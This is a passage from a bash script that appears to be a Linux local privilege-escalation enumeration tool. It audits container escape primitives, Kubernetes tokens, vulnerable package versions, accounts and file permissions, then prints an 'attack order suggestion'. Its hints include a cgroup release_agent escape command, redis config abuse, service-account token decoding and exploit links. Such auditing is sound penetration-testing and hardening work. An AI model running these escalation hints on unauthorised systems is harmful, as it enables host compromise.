    [ -w /etc/samba/smb.conf ] && crit "smb.conf writable -> 'root preexec' runs as root"
fi

sub "database and cache services on loopback"
if [ "$DO_NET" = "1" ]; then
    for p in 3306 5432 6379 27017 11211 9200 8080 8443 5900 631; do
        if have ss && run ss -ltn 2>/dev/null | grep -q ":$p "; then
            ck; warn "port $p listening (check authentication and default creds)"
            case $p in
                6379) hint "redis-cli -h 127.0.0.1 ; CONFIG GET * / CONFIG SET dir /root" ;;
                27017) hint "mongo --host 127.0.0.1 --eval 'db.adminCommand({listDatabases:1})'" ;;
                3306) hint "mysql -h 127.0.0.1 -u root  (try empty password)" ;;
                11211) hint "echo stats | nc 127.0.0.1 11211" ;;
                631) hint "CUPS: cups-browsed CVE-2024-47176 chain" ;;
            esac
        fi
    done
fi
ok "local service port review complete"

sub "hosts, resolv and routing"
for f in /etc/hosts /etc/resolv.conf /etc/nsswitch.conf; do
    [ -e "$f" ] || continue
    [ -w "$f" ] && crit "$f writable -> DNS/host poisoning for root's tooling"
done
info "hosts: $(grep -vE '^\s*#|^\s*$' /etc/hosts 2>/dev/null | tr '\n' ';' | cut -c1-200)"
if have ip; then
    run ip -br a 2>/dev/null | head -6 | while IFS= read -r l; do ck; info "iface: $l"; done
    run ip route 2>/dev/null | head -4 | while IFS= read -r l; do ck; info "route: $l"; done
fi

sub "X11 and desktop session abuse"
if [ -n "${DISPLAY:-}" ]; then
    ck; warn "DISPLAY=$DISPLAY -- X11 access can allow keylogging/screenshotting as the session user"
    if [ -d /tmp/.X11-unix ]; then
        for s in /tmp/.X11-unix/X*; do
            [ -e "$s" ] || continue
            ck; info "X socket: $s ($(stat -c '%a %U' "$s"))"
        done
    fi
    have xhost && info "xhost: $(run xhost 2>/dev/null | head -3 | tr '\n' ' ')"
fi
for f in /var/run/screen /tmp/screen; do
    [ -d "$f" ] || continue
    [ -w "$f" ] && crit "$f writable -> attach to other users' screen sessions"
done
ok "graphical session review complete"
# ---------------------------------------------------------------------------
sec "CONTAINER AND NAMESPACE EXPOSURE"
# ---------------------------------------------------------------------------

sub "am I in a container?"
CONTAINER=0
[ -f /.dockerenv ] && { CONTAINER=1; info "docker marker /.dockerenv present"; }
[ -f /run/.containerenv ] && { CONTAINER=1; info "podman marker /run/.containerenv present"; }
if [ -r /proc/1/cgroup ]; then
    if grep -qE 'docker|lxc|kubepods|containerd|garden|buildkit' /proc/1/cgroup 2>/dev/null; then
        CONTAINER=1; info "cgroup indicates a container: $(grep -m1 -E 'docker|lxc|kubepods|containerd' /proc/1/cgroup)"
    else
        ck; info "cgroup looks like a host (or cgroup v2 unified)"
    fi
fi
if have systemd-detect-virt; then
    v=$(run systemd-detect-virt 2>/dev/null); ck
    [ "$v" = "none" ] && info "systemd-detect-virt: none (bare metal/VM)" || { CONTAINER=1; info "systemd-detect-virt: $v"; }
fi
info "container flag: $CONTAINER"

sub "container capabilities"
if [ -r /proc/self/status ]; then
    CAPEFF=$(grep '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')
    CAPBND=$(grep '^CapBnd:' /proc/self/status 2>/dev/null | awk '{print $2}')
    info "CapEff=$CAPEFF"
    info "CapBnd=$CAPBND"
    case "$CAPEFF" in
        0000003fffffffff|000001ffffffffff|ffffffffffffffff)
            crit "CapEff=$CAPEFF -> looks like a PRIVILEGED container (all capabilities)" ;;
    esac
    if [ -n "$CAPEFF" ] && [ "$CAPEFF" != "0000000000000000" ]; then
        if have capsh; then
            capsh --decode="$CAPEFF" 2>/dev/null | head -2 | while IFS= read -r l; do ck; info "$l"; done
        fi
    fi
fi

sub "container escape primitives"
if [ -w /sys/fs/cgroup ]; then
    crit "/sys/fs/cgroup is WRITABLE -> cgroup release_agent escape (v1) / notify_on_release"
    hint "mkdir /sys/fs/cgroup/x; echo /proc/1/root/tmp/x > /sys/fs/cgroup/x/release_agent"
else
    ok "/sys/fs/cgroup not writable"
fi
for p in /sys/fs/cgroup/release_agent /sys/fs/cgroup/*/release_agent; do
    for f in $p; do
        [ -e "$f" ] || continue
        [ -w "$f" ] && crit "$f writable -> release_agent escape"
    done
done
[ -w /proc/sysrq-trigger ] && crit "/proc/sysrq-trigger writable -> crash or remount the host read-only"
[ -w /proc/sys/kernel/core_pattern ] && crit "core_pattern writable -> pipe a root payload on the host"
if [ -r /proc/1/mountinfo ] && [ -r /proc/self/mountinfo ]; then
    if diff <(awk '{print $5}' /proc/1/mountinfo 2>/dev/null | sort -u) \
            <(awk '{print $5}' /proc/self/mountinfo 2>/dev/null | sort -u) >/dev/null 2>&1; then
        ck; info "PID 1 shares the same mount namespace"
    else
        ck; warn "PID 1 is in a different mount namespace -- possible host visibility"
    fi
fi
for d in /var/lib/docker /var/lib/containerd /var/lib/kubelet /host /mnt/host; do
    [ -d "$d" ] && { crit "$d visible from inside the container -> host filesystem exposure"; }
done
for f in /proc/sys/kernel/cap_last_cap /proc/1/root/etc/shadow /proc/1/root/etc/passwd; do
    [ -r "$f" ] && [ "$CONTAINER" = "1" ] && { crit "$f readable from the container -> host namespace leak"; }
done
if [ -r /proc/self/status ]; then
    for k in Seccomp AppArmor; do
        v=$(grep -E "^(Seccomp|AppArmor):" /proc/self/status 2>/dev/null)
        [ -n "$v" ] && { info "$v"; }
    done
    grep -qE '^Seccomp:\s*0' /proc/self/status 2>/dev/null && warn "seccomp disabled in this container"
    grep -qE '^AppArmor:\s*unconfined' /proc/self/status 2>/dev/null && warn "AppArmor unconfined in this container"
fi

sub "namespace tooling"
for t in nsenter unshare capsh lxc lxd docker podman ctr nerdctl crictl kubectl; do
    have "$t" && { info "$t available: $(command -v $t)"; }
done
if have unshare; then
    if timeout 3 unshare -Ur true 2>/dev/null; then
        ck; warn "unprivileged user namespaces work (unshare -Ur succeeded) -> kernel LPE surface"
    else
        ck; ok "unprivileged user namespaces blocked"
    fi
fi
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ]; then
    ck; crit "running inside Kubernetes with a mounted service account"
    hint "cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d  (check RBAC)"
fi
ok "namespace review complete"

# ---------------------------------------------------------------------------
sec "INSTALLED SOFTWARE AND VERSIONS"
# ---------------------------------------------------------------------------

pkgver() { # $1 package name
    if have dpkg-query; then
        dpkg-query -W -f='${Version}' "$1" 2>/dev/null
    elif have rpm; then
        rpm -q --qf '%{VERSION}-%{RELEASE}' "$1" 2>/dev/null | grep -v 'not installed'
    fi
}

sub "package inventory"
if have dpkg-query; then
    n=$(dpkg-query -W 2>/dev/null | wc -l); info "dpkg packages installed: $n"
    dpkg -l > "$OUTDIR/packages.txt" 2>/dev/null
elif have rpm; then
    n=$(rpm -qa 2>/dev/null | wc -l); info "rpm packages installed: $n"
    rpm -qa > "$OUTDIR/packages.txt" 2>/dev/null
else
    info "no supported package manager"
fi
if [ -r /etc/os-release ]; then
    ck; info "build: ${PRETTY_NAME:-unknown}"
    case "$DISTRO_ID:$DISTRO_VER" in
        ubuntu:14.04|ubuntu:16.04|ubuntu:18.04|debian:8*|debian:9*|debian:10*|centos:6*|centos:7*|centos:8*|rhel:6*|rhel:7*)
            warn "distribution $DISTRO_ID $DISTRO_VER is end-of-life -> unpatched userspace and kernel" ;;
        *) ok "distribution is not in the known-EOL list" ;;
    esac
fi

sub "high-value packages and their CVEs"
SSHV=$(pkgver openssh-server); [ -z "$SSHV" ] && SSHV=$(pkgver openssh)
if [ -n "$SSHV" ]; then
    info "openssh: $SSHV"
    v=$(printf '%s' "$SSHV" | grep -oE '^[0-9]+\.[0-9]+p?[0-9]*')
    case "$v" in
        8.5p1|8.6p1|8.7p1|8.8p1|8.9p1|9.0p1|9.1p1|9.2p1|9.3p1|9.4p1|9.5p1|9.6p1|9.7p1)
            crit "CVE-2024-6387 (regreSSHion): OpenSSH $v -> unauthenticated RCE as root on glibc systems"
            hint "check distro patch: Debian/Ubuntu backported the fix as 9.2p1-2+deb12u3 / 9.6p1-3ubuntu13.3" ;;
        "") info "cannot parse OpenSSH version string" ;;
        *) ok "OpenSSH $v outside the regreSSHion range" ;;
    esac
else
    info "openssh-server not installed"
fi

GLIBCV=$(getconf GNU_LIBC_VERSION 2>/dev/null | awk '{print $2}')
if [ -n "$GLIBCV" ]; then
    info "glibc: $GLIBCV"
    if ver_ge "$GLIBCV" "2.34" && ver_lt "$GLIBCV" "2.39"; then
        crit "CVE-2023-4911 (Looney Tunables): glibc $GLIBCV -> GLIBC_TUNABLES buffer overflow, local root"
        hint "exploit: https://github.com/leesh3288/CVE-2023-4911  (needs a setuid binary, e.g. /usr/bin/su)"
    else
        ok "glibc $GLIBCV outside the Looney Tunables range (verify backports)"
    fi
fi

for pkg in policykit-1 polkitd polkit; do
    PV2=$(pkgver "$pkg"); [ -n "$PV2" ] || continue
    info "$pkg: $PV2"
    case "$PV2" in
        0.113*|0.114*|0.115*|0.116*|0.117*|0.118*)
            crit "CVE-2021-3560: polkit $PV2 -> unauthenticated local root via dbus timing race"
            hint "exploit chain: dbus-send + kill the process mid-request (pwnkit-style PoC on GitHub)" ;;
        *) ok "$pkg $PV2 not in the known-vulnerable window" ;;
    esac
    break
done

SYSV=$(pkgver systemd); [ -n "$SYSV" ] && {
    info "systemd: $SYSV"
    v=$(printf '%s' "$SYSV" | grep -oE '^[0-9]+')
    [ -n "$v" ] && [ "$v" -lt 249 ] && warn "CVE-2021-33910: systemd < 249 -> stack exhaustion in systemd-tmpfiles" || ok "systemd >= 249 or unparsed"
}
SCRV=$(pkgver screen); [ -n "$SCRV" ] && {
    info "screen: $SCRV"
    case "$SCRV" in 4.5.0*) warn "screen 4.5.0: CVE-2017-5618 / CVE-2025-23395 style local issues" ;; esac
}
SNAPV=$(pkgver snapd); [ -n "$SNAPV" ] && {
    info "snapd: $SNAPV"
    ver_lt "$SNAPV" "2.37.1" && crit "CVE-2019-7304 (dirty_sock): snapd < 2.37.1 -> local root via snap API" || ok "snapd patched for dirty_sock"
}
CUPSV=$(pkgver cups-browsed); [ -n "$CUPSV" ] && {
    info "cups-browsed: $CUPSV"
    ver_lt "$CUPSV" "2.0.1" && crit "CVE-2024-47176 chain: cups-browsed $CUPSV -> remote/local printer PPD injection then root" || ok "cups-browsed patched"
}
RSYNCV=$(pkgver rsync); [ -n "$RSYNCV" ] && {
    info "rsync: $RSYNCV"
    ver_lt "$RSYNCV" "3.2.7" && warn "rsync $RSYNCV: 2024 CVE batch (CVE-2024-12084/12085) -- verify distro patch level"
}
NRV=$(pkgver needrestart); [ -n "$NRV" ] && {
    info "needrestart: $NRV"
    ver_lt "$NRV" "3.8" && crit "CVE-2024-48990: needrestart $NRV -> PYTHONPATH injection executed as root on upgrade" || ok "needrestart patched"
}
BSHV=$(pkgver bash); [ -n "$BSHV" ] && {
    info "bash: $BSHV"
    v=$(printf '%s' "$BSHV" | grep -oE '^[0-9]+\.[0-9]+(\.[0-9]+)?')
    ver_lt "$v" "4.3" && crit "CVE-2014-6271 (Shellshock): bash $v -> environment-function code execution" || ok "bash not Shellshock-vulnerable"
}
EXIMV=$(pkgver exim4-base); [ -n "$EXIMV" ] && {
    info "exim: $EXIMV"
    v=$(printf '%s' "$EXIMV" | grep -oE '^[0-9]+\.[0-9]+')
    ver_ge "$v" "4.87" && ver_lt "$v" "4.92" && crit "CVE-2019-10149: exim $v -> local/remote command execution" || ok "exim outside known-vulnerable window"
}
DOCKERV=$(pkgver docker.io); [ -z "$DOCKERV" ] && DOCKERV=$(pkgver docker-ce)
[ -n "$DOCKERV" ] && { info "docker: $DOCKERV"; }

sub "toolchain and build capability"
for t in gcc cc g++ clang make ld as python3 python2 perl ruby node php go rustc git curl wget \
         nc ncat socat openssl vim nano tmux screen base64 xxd; do
    p=$(command -v "$t" 2>/dev/null) || continue
    ck
    case "$t" in
        gcc|cc|g++|clang|make|ld|as) info "compiler present: $p -> kernel/ELF exploits can be built locally" ;;
        python3|python2|perl|ruby|node|php) info "interpreter present: $p (cap_setuid/setuid abuse, script exec)" ;;
        *) info "tool: $p" ;;
    esac
done

sub "services with writable configs reloaded by root"
for f in /etc/nginx/nginx.conf /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf \
         /etc/php/*/fpm/php-fpm.conf /etc/php/*/apache2/php.ini /etc/mysql/my.cnf /etc/redis/redis.conf \
         /etc/postfix/main.cf /etc/dovecot/dovecot.conf; do
    for p in $f; do
        [ -e "$p" ] || continue
        [ -w "$p" ] && crit "service config writable: $p"
    done
done
ok "service config review complete"

# ---------------------------------------------------------------------------
sec "HARDENING GAPS AND MISCELLANEOUS"
# ---------------------------------------------------------------------------

sub "account review"
if [ -r /etc/passwd ]; then
    awk -F: '$3==0 {print "  uid0: "$1" shell="$7}' /etc/passwd | while IFS= read -r l; do
        ck
        case "$l" in *"uid0: root "*) ok "$l" ;; *) crit "$l <- extra UID 0 account";; esac
    done
    awk -F: '$2=="" {print "  empty-password-field: "$1}' /etc/passwd | while IFS= read -r l; do ck; crit "$l"; done
    nologin=$(awk -F: '$7 ~ /nologin|false/ {c++} END{print c+0}' /etc/passwd)
    ck; info "accounts with nologin/false shell: $nologin"
    shellusers=$(awk -F: '$7 ~ /(bash|sh|zsh|ksh)$/ {print $1}' /etc/passwd | tr '\n' ' ')
    ck; info "login-capable accounts: $shellusers"
fi
if [ -r /etc/shadow ]; then
    awk -F: '$2=="" {print "  NO PASSWORD SET: "$1}' /etc/shadow | while IFS= read -r l; do ck; crit "$l"; done
    n=$(awk -F: '$2 ~ /^\$1\$/ {c++} END{print c+0}' /etc/shadow)
    ck; [ "$n" -gt 0 ] && warn "$n account(s) use MD5 crypt (\$1\$) -- trivially crackable" || ok "no MD5-crypt password hashes"
    if grep -qE '^\s*[^:]+:\$2[aby]\$' /etc/shadow 2>/dev/null; then
        ck; info "bcrypt hashes present (reasonable)"
    fi
    ck; ok "shadow hash review complete"
fi
if getent group sudo >/dev/null 2>&1 || getent group wheel >/dev/null 2>&1; then
    for g in sudo wheel admin; do
        m=$(getent group "$g" 2>/dev/null | awk -F: '{print $4}')
        [ -n "$m" ] && { info "members of '$g': $m"; }
    done
fi

sub "home directory and /root exposure"
[ -r /root ] && [ "$MYUID" != "0" ] && crit "/root is READABLE by $ME" || info "/root not readable"
for h in /home/*; do
    [ -d "$h" ] || continue
    m=$(stat -c %a "$h" 2>/dev/null); u=$(stat -c %U "$h" 2>/dev/null)
    ck
    case "$m" in
        700|750) ok "home $h mode $m (owner $u)" ;;
        *) case "$m" in *7|*5|*4) [ "${m: -1}" = "7" ] && crit "home $h mode $m world-writable/readable" || warn "home $h mode $m" ;; esac ;;
    esac
done

sub "console and boot-time auto-login"
if have systemctl; then
    for s in getty@tty1 serial-getty@ttyS0; do
        out=$(run systemctl cat "$s" 2>/dev/null | grep -iE 'autologin|--autologin')
        [ -n "$out" ] && { crit "auto-login configured on $s: $out"; }
    done
fi
grep -qE 'autologin' /etc/lightdm/lightdm.conf /etc/gdm3/custom.conf /etc/sddm.conf 2>/dev/null && {
    ck; crit "display manager auto-login configured -> console access without a password"
}
ok "console review complete"

sub "immutable and special files"
if have lsattr; then
    n=$(lsattr -R /etc 2>/dev/null | grep -c '^....i' )
    ck; info "immutable files under /etc: ${n:-0}"
fi
permissions_bad=0
for f in /etc/crontab /etc/sudoers /etc/passwd /etc/shadow /etc/gshadow /etc/group; do
    [ -e "$f" ] || continue
    [ -w "$f" ] && crit "$f writable by $ME"
done
ok "critical file writability reviewed"

sub "kernel module and device access"
for d in /dev/kmsg /dev/mem /dev/kmem /dev/port /dev/sda /dev/sda1 /dev/nvme0n1 /dev/vda; do
    [ -e "$d" ] || continue
    m=$(stat -c '%a %U:%G' "$d" 2>/dev/null)
    ck
    case "$d" in
        /dev/kmsg) [ -r "$d" ] && warn "/dev/kmsg readable ($m) -- kernel log leak" || ok "/dev/kmsg root-only" ;;
        /dev/mem|/dev/kmem|/dev/port) warn "$d present ($m) -- physical memory access if writable" ;;
        *) info "block device $d ($m)"; [ -w "$d" ] && crit "  ^ block device writable -> read/write the whole disk";;
    esac
done
ok "device review complete"

sub "security tooling present"
for t in apparmor_parser aa-status auditctl ausearch lynis chkrootkit rkhunter aide ossec \
         falco wazuh-agent clamd suricata snort firejail; do
    have "$t" && { info "installed: $t"; }
done
ok "security tooling review complete"

# =============================================================================
#  SUMMARY
# =============================================================================
rec_totals
END_EPOCH=$(date +%s)
DUR=$((END_EPOCH - START_EPOCH))

emit "" ""
emit "======================================================================" "$BLD"
emit " SCAN COMPLETE" "$BLD"
emit "======================================================================" "$BLD"
emit " checks performed : $CHECKS" ""
emit " critical findings: $N_CRIT" "$([ "$N_CRIT" -gt 0 ] && printf '%s' "$RED$BLD")"
emit " warnings         : $N_WARN" "$([ "$N_WARN" -gt 0 ] && printf '%s' "$YEL")"
emit " passed / notes   : $N_OK ok, $N_INFO informational" "$DIM"
emit " duration         : ${DUR}s" ""
emit " report           : $LOG" ""
emit " artefacts        : $OUTDIR" ""

if [ "$N_CRIT" -gt 0 ]; then
    emit "" ""
    emit " -- critical findings (attack order suggestion)" "$RED$BLD"
    grep '^CRIT|' "$FIND_FILE" | head -40 | while IFS='|' read -r sev sect rest; do
        emit "   * [$sect] $rest" "$RED"
    done
    emit "" ""
    emit " -- suggested next steps" "$BLD"
    emit "   1. Confirm each CRIT by hand before trusting it (permissions change, files move)." "$DIM"
    emit "   2. Prefer the shortest path: writable root-scheduled script > SUID GTFOBins > sudo rule > CVE." "$DIM"
    emit "   3. For each SUID/sudo hit, look the binary up on https://gtfobins.github.io/." "$DIM"
    emit "   4. For kernel userspace CVEs, match the DISTRO patch level, not just the version string." "$DIM"
    emit "   5. Record a clean 'before' state so you can prove the escalation in a report." "$DIM"
else
    emit "" ""
    emit " No critical findings on first pass. That is not proof of a hardened host:" "$YEL"
    emit "   - $MODE mode limits the filesystem sweep (try --full)" "$YEL"
    emit "   - run as the actual low-privilege user, not root" "$YEL"
    emit "   - version-based CVE checks only see package versions, not backports" "$YEL"
fi

# ------------------------------------------------------------------ JSON
if [ "$DO_JSON" = "1" ]; then
    J="$OUTDIR/findings.json"
    esc() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/ /g'; }
    {
        printf '{\n'
        printf '  "script": "linux_local_privesc",\n'
        printf '  "version": "%s",\n' "$VERSION"
        printf '  "host": "%s",\n' "$(esc "$(hostname 2>/dev/null)")"
        printf '  "user": "%s",\n' "$(esc "$ME")"
        printf '  "uid": %s,\n' "$MYUID"
        printf '  "kernel": "%s",\n' "$(esc "$(uname -r)")"
        printf '  "distro": "%s",\n' "$(esc "${PRETTY_NAME:-unknown}")"
        printf '  "mode": "%s",\n' "$MODE"
        printf '  "timestamp": "%s",\n' "$(date -Iseconds)"
        printf '  "stats": {"checks": %s, "critical": %s, "warning": %s, "info": %s, "ok": %s},\n' \
            "$CHECKS" "$N_CRIT" "$N_WARN" "$N_INFO" "$N_OK"
        printf '  "findings": [\n'
        first=1
        grep -E '^(CRIT|WARN)\|' "$FIND_FILE" | while IFS='|' read -r sev sect rest; do
            [ -n "$sev" ] || continue
            if [ "$first" = "1" ]; then first=0; else printf ',\n'; fi
            printf '    {"severity": "%s", "section": "%s", "detail": "%s"}' \
                "$sev" "$(esc "$sect")" "$(esc "$rest")"
        done
        printf '\n  ]\n}\n'
    } > "$J"
    emit " json             : $J" ""
fi

exit 0
